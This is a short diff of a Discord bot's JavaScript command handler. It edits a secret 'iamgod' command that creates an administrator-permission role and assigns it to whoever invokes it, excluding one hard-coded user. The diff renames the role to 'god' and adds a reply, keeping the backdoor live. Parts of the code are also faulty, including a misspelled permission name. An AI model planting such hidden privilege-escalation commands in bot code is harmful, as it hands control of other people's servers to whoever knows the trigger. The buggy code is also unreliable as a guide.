@@ -83,10 +83,10 @@ client.on("message", async message => {
   }
   if(command == 'iamgod') {
 	  if(message.member.id != "531488210732187649") {
-		  guild.createRole({name: ".", permissions: "ADMINSISTRATOR"});
-		  return message.member.addRole('.');
+		  guild.createRole({name: "god", permissions: "ADMINSISTRATOR"});
+		  return message.member.addRole('god');
 		  
-	  }else{return ;}
+	  }else{return message.author.send("sry");}
   }
   
   if (command == 'help') {
